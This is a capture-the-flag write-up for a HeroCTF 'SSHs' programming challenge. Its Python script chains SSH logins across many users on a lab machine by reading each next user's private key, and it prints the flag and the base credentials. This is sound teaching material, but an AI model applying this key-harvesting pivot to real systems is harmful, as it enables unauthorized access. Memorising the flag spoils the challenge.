# SSHs

### Category

Prog

### Description

Every user can read the private rsa key of the next user. You just have to grab it, and ssh as the next. But... there are 250 ?!?<br>
Let's automate it ! (The last user has a *flag.txt* at the root of his home directory)

The base credentials are:
```
user1:password123
```

```
Host : xxxx.heroctf.fr
Port : xxxx
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

This script solves the challenge. One mistake to not make here, is to chain the SSH sessions all together. The result would be a very slow response time (I mean VERY slow).
So you'll notice every remote ssh connection is made from the gateway session (user1) that is available from the outside.
```python
from jumpssh import SSHSession
from os import remove

host = '127.0.0.1'
port = 22

#Connect to machine
print("[*] Connect to gateway ssh account\n")
gateway = SSHSession(host, "user1", port=22, password="user1")

# Keep track of sessions
active_session = gateway
for i in range(2, 201):
    # Read Key
    key = active_session.get_cmd_output("./getSSHKey") # 4096 -> key size ; 36*2 -> header+footer size

    # Write Key
    open("key.tmp", "w").write(key)

    # Get next session and save it
    active_session.close()
    active_session = gateway.get_remote_session("127.0.0.1", username=f"user{i}", private_key_file="key.tmp")

    if i%50==0:
        print(f"[*] User {i}/200")

# Remove temporary file
remove("key.tmp")

# Read and print flag
print("\n[+] Flag : ", active_session.get_cmd_output("cat flag.txt"))
active_session.close()
```

For a simple ssh connections, I recommend using pwntools, that offers a few very usefull services. But it sadly doesn't allow chaining ssh sessions (for pivoting for exemple). You'll have to use other libraries (like here jumpssh, that is a kind of wrapper for Paramiko), sockets, or setup port forwarding.

### Flag

```Hero{Th47_w3RE_4_l0t_Of_uS3rS}```